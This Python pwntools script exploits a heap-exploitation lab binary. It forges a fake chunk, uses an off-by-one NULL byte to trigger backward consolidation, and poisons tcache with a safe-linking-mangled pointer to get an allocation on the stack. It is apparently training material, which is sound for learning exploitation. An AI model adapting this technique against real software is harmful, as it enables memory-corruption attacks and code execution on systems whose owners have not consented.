#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr


def exploit(p):
    print("getting leaks")
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"  stack_ptr: {stack_ptr:#x} (this is our target address)")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"  data_ptr: {data_ptr:#x}\n")

    print("create a_alloc to hold the fake chunk")
    p.clean()
    p.sendline(b"malloc 0x38")
    p.recvuntil(b"[*] ")
    a_ptr = int(p.recvline()[:-1], 16)
    print(f"  a_ptr({a_ptr:#x}) = malloc(0x38)")

    print("write the fake chunk at a_ptr")
    p.sendline(f"write {a_ptr:#x} {8*4:#x}".encode())
    p.send(
        pwn.p64(0x0)   +            # prev_size
        pwn.p64(0xdeadbeef)  +      # size (placeholder)
        pwn.p64(a_ptr) +            # fd
        pwn.p64(a_ptr)              # bk
    )
    print()

    print(f"create b_alloc to overflow a NULL byte into the metadata of the next chunk")
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    b_ptr = int(p.recvline()[:-1], 16)
    print(f"  b_ptr({b_ptr:#x}) = malloc(0x38)")
    b_chunk_size = 0x28
    print(f"  b_chunk_size = {b_chunk_size:#x}\n")

    print(f"create c_alloc, this one will be corrupted by an off-by-one error from b_ptr")
    p.clean()
    p.sendline(b"malloc 0xf8")
    p.recvuntil(b"[*] ")
    c_ptr = int(p.recvline()[:-1], 16)
    print(f"  c_ptr({c_ptr:#x}) = malloc(0xf8)\n")

    print(f"now use b_ptr to corrupt c_alloc metadata:")
    print(f"  - overwrite prev_size")
    print(f"  - use off-by-one error to clear its prev_in_use flag with a NULL byte")
    fake_prev_size = (c_ptr - 8*2) - a_ptr
    payload = (
        b"a" * (b_chunk_size - 8) + # padding
        pwn.p64(fake_prev_size) +   # prev_size
        b"\x00"                     # clears prev_in_use
    )
    p.sendline(f"write {b_ptr:#x} {len(payload):#x}".encode())
    p.send(payload)
    print()

    print("write fake chunk at a_ptr with fake size.")
    print("fd and bk pointing to itself to bypass unlink checks.")
    p.sendline(f"write {a_ptr:#x} {8*4:#x}".encode())
    p.send(
        pwn.p64(0x0) +              # prev_size
        pwn.p64(fake_prev_size) +   # size
        pwn.p64(a_ptr) +            # fd
        pwn.p64(a_ptr)              # bk
    )
    print()

    print("create 7 alloc to be used to fill tcache bin 0x100")
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0xf8")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    print("fill tcache bin 0x100")
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())
    print()

    # free c alloc to consolidate back to the fake chunk
    # and create an overlap
    p.sendline(f"free {c_ptr:#x}".encode())

    # alloc starting from our fake chunk
    p.clean()
    p.sendline(b"malloc 0x158")
    p.recvuntil(b"[*] ")
    evil_ptr = int(p.recvline()[:-1], 16)

    # alloc a chunk and free it to tcache bin 0x30
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    pad_ptr = int(p.recvline()[:-1], 16)
    p.sendline(f"free {pad_ptr:#x}".encode())

    # now we free b_ptr
    # tcache [0x30]: b_ptr -> pad_ptr
    p.sendline(f"free {b_ptr:#x}".encode())

    print(f"at this point:")
    print(f"  - tcache [0x30]: b_ptr({b_ptr:#x}) -> pad_ptr({pad_ptr:#x})")
    print(f"  - evil_ptr({evil_ptr:#x}) is an overlapping alloc with size 0x160")
    print(f"  - evil_ptr({evil_ptr:#x}) is only {b_ptr - evil_ptr:#x} bytes from b_ptr({b_ptr:#x})")

    print(f"ready to perform tcache poisoning through evil_ptr")

    print(f"using overlap to overwrite b_alloc->fd")
    fake_fd = protect_ptr(evil_ptr, stack_ptr)
    p.sendline(f"write {evil_ptr:#x} {b_ptr - evil_ptr + 8:#x}".encode())
    payload = b"a" * (b_ptr - evil_ptr) + pwn.p64(fake_fd)
    p.send(payload)

    # pad_alloc, we dont care
    p.sendline(b"malloc 0x28")

    # get poisoned tcache entry
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    arbitrary_ptr = int(p.recvline()[:-1], 16)
    print(f"arbitrary allocation achieved: {arbitrary_ptr:#x}")
    

def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
